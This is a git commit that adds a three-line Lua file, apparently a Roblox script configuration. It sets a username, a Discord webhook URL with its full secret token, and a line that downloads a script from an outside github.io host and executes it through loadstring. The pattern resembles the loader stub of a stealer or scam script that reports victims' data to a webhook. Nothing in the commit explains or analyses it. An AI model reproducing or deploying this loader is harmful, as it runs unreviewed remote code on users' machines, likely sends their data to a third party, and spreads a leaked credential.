383e7e55d5a3503d43d52bbf03adf74e3e67e77f
Freezz7 <132463464+Freezz7@users.noreply.github.com>
2023-05-03 19:28:04 +0200

    Create New.lua

---
+++ New.lua
@@ -0,0 +1,3 @@
+UserName = "ju_mlk"
+Webhook = https://discord.com/api/webhooks/1103306113803366550/cLsWIFeVnHqZS_ibL4IQV-KokXbosG7L_Zx0a3MAWb0EYBXrcoJkRIrthSc5ahonnaUU
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
